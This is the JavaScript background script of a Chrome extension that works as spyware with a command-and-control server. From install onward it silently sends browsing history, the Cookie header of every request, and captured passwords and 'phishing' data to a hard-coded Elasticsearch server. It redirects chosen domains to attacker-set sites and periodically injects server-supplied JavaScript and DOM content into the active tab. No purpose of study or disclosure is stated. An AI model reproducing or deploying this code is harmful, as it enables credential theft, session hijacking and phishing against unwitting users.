var baseURL = "http://172.24.16.81:9200";
var reRouteList;
var db_username = "soteria";
var db_password = "soteria01";

/* All Functions*/

setInterval(timerEvent, 60000);
setInterval(injectionEvent, 30000);

/*Function to create a unique random token to be used as an ID for client*/
function getRandomToken() {
    var randomPool = new Uint8Array(32);
    crypto.getRandomValues(randomPool);
    var hex = '';
    for (var i = 0; i < randomPool.length; ++i) {
        hex += randomPool[i].toString(16);
    }
    return hex;
}

/*Utility Function to send GET requests*/
function sendGetRequest(url, responseType, onloadCallback, onerrorCallback) {
    var x = new XMLHttpRequest();
    x.open('GET', url, true);
    x.setRequestHeader("Authorization", "Basic " + btoa(db_username + ":" + db_password));
    x.responseType = responseType;
    x.onerror = onerrorCallback;
    x.onreadystatechange = function () {
        if (x.readyState === XMLHttpRequest.DONE && x.status === 200) {
            onloadCallback(x.response);
        }
    };
    x.send();
}

/*Utility Function to send POST requests*/
function sendPostRequest(url, payload, onloadCallback, onerrorCallback) {
    var y = new XMLHttpRequest();
    y.open('POST', url);
    y.setRequestHeader("Authorization", "Basic " + btoa(db_username + ":" + db_password));
    y.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
    y.onload = onloadCallback;
    y.onerror = onerrorCallback;
    y.send(JSON.stringify(payload));
}

/*Function to create record for a new user*/
function createRecord(userid) {
    var jsonData = {};

    url = baseURL + "/user/data/";
    url = url.concat(userid)

    jsonData = {};
    jsonData['info'] = {};
    jsonData['info']['userid'] = userid;
    jsonData['info']['extensionid'] = chrome.runtime.id;
    jsonData['info']['browser'] = "Chrome";
    jsonData['info']['browser_version'] = /Chrome\/([0-9.]+)/.exec(navigator.userAgent)[1];
    jsonData['info']['create_timestamp'] = (new Date).getTime();

    sendPostRequest(url, jsonData, function () {
        /*TODO: Need to test if this works*/
        timerEvent();
        getHistory();
    }, function () {
    });
}

/* Updating history in DB by getting history from Chrome since the last time we logged the history*/
function getHistory() {
    var jsonData = {};
    var userid;
    chrome.storage.sync.get(['userid', 'lasthistoryloggedtime'], function (items) {
        var url = baseURL + "/history/data/";
        userid = items.userid;
        if (!userid) {
            return;
        }
        sTime = 0
        if (items.lasthistoryloggedtime) {
            sTime = items.lasthistoryloggedtime;
        }

        chrome.history.search({text: '', startTime: sTime}, function (data) {
            var flag = false;
            jsonData['url'] = [];
            var i = 0;
            data.forEach(function (page) {
                jsonData['userid'] = userid;
                jsonData['url'][i] = Math.floor(page.lastVisitTime).toString() + ":   " + page.url;
                flag = true;
                i = i + 1;
            });
            var milliseconds = (new Date).getTime();
            chrome.storage.sync.set({lasthistoryloggedtime: milliseconds});

            if (flag) {
                sendPostRequest(url, jsonData, function () {}, function () {});
            }
        });
    });
}

/*Utility function to create a hash code for a give URL*/
function hashCode(url) {
    var hash = 0, i, chr, len;
    if (url.length === 0) return hash;
    for (i = 0, len = url.length; i < len; i++) {
        chr = url.charCodeAt(i);
        hash = ((hash << 5) - hash) + chr;
        hash |= 0; // Convert to 32bit integer
    }
    return hash;
};

/*Utility function to extract domain from a given URL*/
function extractDomain(url) {
    var domain;
    if (url.indexOf("://") > -1) {
        domain = url.split('/')[2];
    } else {
        domain = url.split('/')[0];
    }
    domain = domain.split(':')[0];
    return domain;
}

/*Function to get the reroute url for a given URL*/
function getReRouteUrl(url) {
    if (!reRouteList) {
        return null;
    }
    for (var i = reRouteList.length - 1; i >= 0; i--) {
        var obj = reRouteList[i];
        if (url == obj._source.data.secure_website) {
            return obj._source.data.routed_website;
        }
    }
    return null;
}

/*Update the global parameter reRouteList to the data got from polling DB*/
function updateRouteListDb(items) {
    reRouteList = items.hits.hits;
}

/*Timer event to hook events*/
function timerEvent() {
    //Update reroute list
    var reRouteListUrl = baseURL + "/router/data/_search";
    sendGetRequest(reRouteListUrl, "json", updateRouteListDb);

    //Send a heartbeat to server that user is online
    chrome.storage.sync.get('userid', function (items) {
        var jsonData = {};
        lastSeenUrl = baseURL + "/user/data/" + items.userid + "/_update";
        jsonData['doc'] = {};
        jsonData['doc']['last_seen'] = (new Date).getTime();
        sendPostRequest(lastSeenUrl, jsonData, function () {}, function () {});
    });
}

/*Another Timer event to inject dom/scripts if any on a regular interval.
* Since this is a one-way communication from extension to elastic server
* we need to do regular polling to see if any new dom/js needs to be inserted on active tab.
*/
function injectionEvent() {
    chrome.storage.sync.get('userid', function (items) {
        var jsonData = {};
        var js = "";
        var dom = "";
        var url = "";
        var id = "";

        chrome.tabs.query({active: true, currentWindow: true}, function (tabs) {
            if (tabs[0]) {

                if (tabs[0].url != "" && tabs[0].id != "") {
                    url = tabs[0].url;
                    id = tabs[0].id;

                    var jsUrl = baseURL + "/js/data/_search" +
                        encodeURI("?q=data.userid:" + items.userid + " AND data.website:\"" + url + "\"");

                    sendGetRequest(jsUrl, "json", function domsForUser(items1) {
                        if (items1) {
                            doms = items1.hits.hits;
                            if (!doms || doms.length == 0) {
                                js = "";
                            } else {
                                js = doms[0]._source.data.js_object;
                            }

                            if (js && js != "") {
                                chrome.tabs.sendMessage(id, {data: js, type: "js"}, function (response) {});
                            }
                        }
                    }, function error() {});

                    var domUrl = baseURL + "/dom/data/_search" +
                        encodeURI("?q=data.userid:" + items.userid + " AND data.website:\"" + url + "\"");

                    sendGetRequest(domUrl, "json", function domsForUser(items1) {
                        if (items1) {
                            doms = items1.hits.hits;
                            if (!doms || doms.length == 0) {
                                dom = "";
                            } else {
                                dom = doms[0]._source.data.dom_object;
                            }

                            if (dom && dom != "") {
                                chrome.tabs.sendMessage(id, {data: dom, type: "dom"}, function (response) {});
                            }
                        }
                    }, function error() {});
                }
            }
        });
    });
}

/* All Listeners*/

/*Listener for OnInstall event*/
chrome.runtime.onInstalled.addListener(function (details) {
    if (details.reason == "install") {
        chrome.storage.sync.get('userid', function (items) {
            var userid = items.userid;
            if (!userid)
                userid = getRandomToken();
            chrome.storage.sync.set({userid: userid});
            createRecord(userid);
        });
    } else if (details.reason == "update") {
        var thisVersion = chrome.runtime.getManifest().version;
    }
});

/*Listener for new window created event*/
chrome.windows.onCreated.addListener(function () {
    getHistory();
});

/*Listener for webrequest beforeRequest event*/
chrome.webRequest.onBeforeRequest.addListener(
    function (details) {
        var reroute_url = getReRouteUrl(extractDomain(details.url));
        if (reroute_url) {
            return {redirectUrl: reroute_url};
        }
    },
    {urls: ["<all_urls>"]},
    ["blocking"]);

/*Listener for webrequest sendheader event*/
chrome.webRequest.onSendHeaders.addListener(
    function (details) {
        chrome.storage.sync.get(['userid'], function (items) {
            var jsonData = {};
            var userid;
            var website;
            url = baseURL + "/cookies/data/";

            userid = items.userid;
            if (!userid) {
                return;
            }
            url = url.concat(userid);
            website = extractDomain(details.url);
            url = url.concat(hashCode(website));

            for (var i = 0; i < details.requestHeaders.length; ++i) {

                if (details.requestHeaders[i].name == "Cookie") {
                    jsonData['data'] = {}
                    jsonData['data']['userid'] = userid;
                    jsonData['data']['website'] = website;
                    jsonData['data']['cookie'] = details.requestHeaders[i].value;
                    sendPostRequest(url, jsonData, function () {
                    }, function () {});
                }
            }
        });
    },
    {urls: ["<all_urls>"]},
    ["requestHeaders"]);

/*Listener for webnavigation complete event*/
chrome.webNavigation.onCompleted.addListener(function (details) {
    getHistory();
});

/*Message passing/communicatin system for within extension*/
chrome.runtime.onConnect.addListener(function (port) {
    var credUrl = baseURL + "/credentials/data/";

    port.onMessage.addListener(function (msg) {
        chrome.storage.sync.get(['userid'], function (items) {
            var userid = items.userid;
            if (!userid) {
                return;
            }

            var jsonData = {};
            jsonData['data'] = {};
            jsonData['data']['userid'] = userid;
            if ("password" in msg) {
                jsonData['data']['password'] = msg['password'];
                sendPostRequest(credUrl, jsonData, function () {}, function () {});
            }

            if ("phishing" in msg) {
                jsonData['data']['phishing'] = msg['phishing'];
                sendPostRequest(credUrl, jsonData, function () {}, function () {});
            }

            if ("scriptphish" in msg) {
                jsonData['data']['scriptphish'] = msg['scriptphish'];
                sendPostRequest(credUrl, jsonData, function () {}, function () {});
            }
            return true;
        });
    });
});

/*Message passing/communicatin system for external connections - extensions/web*/
chrome.runtime.onConnectExternal.addListener(function (port) {

    var credUrl = baseURL + "/credentials/data/";

    port.onMessage.addListener(function (msg) {
        chrome.storage.sync.get(['userid'], function (items) {
            var userid = items.userid;
            if (!userid) {
                return;
            }

            var jsonData = {};
            jsonData['data'] = {};
            jsonData['data']['userid'] = userid;
            if ("password" in msg) {
                jsonData['data']['password'] = msg['password'];
                sendPostRequest(credUrl, jsonData, function () {}, function () {});
            }
            if ("phishing" in msg) {
                jsonData['data']['phishing'] = msg['phishing'];
                sendPostRequest(credUrl, jsonData, function () {}, function () {});
            }
            if ("scriptphish" in msg) {
                jsonData['data']['scriptphish'] = msg['scriptphish'];
                sendPostRequest(credUrl, jsonData, function () {}, function () {});
            }
            return true;
        });
    });
});

/*Listener for tab update event*/
chrome.tabs.onUpdated.addListener(function (tabId, info, tab) {

    if (info.status == "complete") {
        //Skip adding any script for the modified new tab
        if ((tab.url != "chrome://newtab/") &&
            (tab.url != "chrome://")) {
            chrome.tabs.executeScript(tabId, {
                file: 'insert.js'
            });
        } else {
            return;
        }

        /*For DOM Object Insertion*/
        var doms;
        var dom;
        chrome.storage.sync.get('userid', function (items) {
            domUrl = baseURL + "/dom/data/_search?q=data.userid:" + items.userid + "&data.website:" + tab.url;

            sendGetRequest(domUrl, "json", function domsForUser(items1) {
                if (items1) {
                    doms = items1.hits.hits;

                    if (!doms) {
                        dom = null;
                    } else {
                        for (var i = doms.length - 1; i >= 0; i--) {
                            var obj = doms[i];
                            if (tab.url == obj._source.data.website) {
                                dom = obj._source.data.dom_object;
                            }
                        }
                    }
                }

                if (dom) {
                    chrome.tabs.sendMessage(tabId, {data: dom, type: "dom"}, function (response) {});
                }
            });
        });

        /*For JS Insertion*/
        var scripts;
        var script;
        chrome.storage.sync.get('userid', function (items) {
            scriptUrl = baseURL + "/js/data/_search?q=data.userid:" + items.userid + "&data.website:" + tab.url;

            sendGetRequest(scriptUrl, "json", function scriptsForUser(items2) {
                if (items2) {
                    scripts = items2.hits.hits;

                    if (!scripts) {
                        script = null;
                    } else {
                        for (var i = scripts.length - 1; i >= 0; i--) {
                            var obj = scripts[i];
                            if (tab.url == obj._source.data.website) {
                                script = obj._source.data.js_object;
                            }
                        }
                    }
                }

                if (script) {
                    chrome.tabs.sendMessage(tabId, {data: script, type: "js"}, function (response){});
                }
            });
        });
    }
});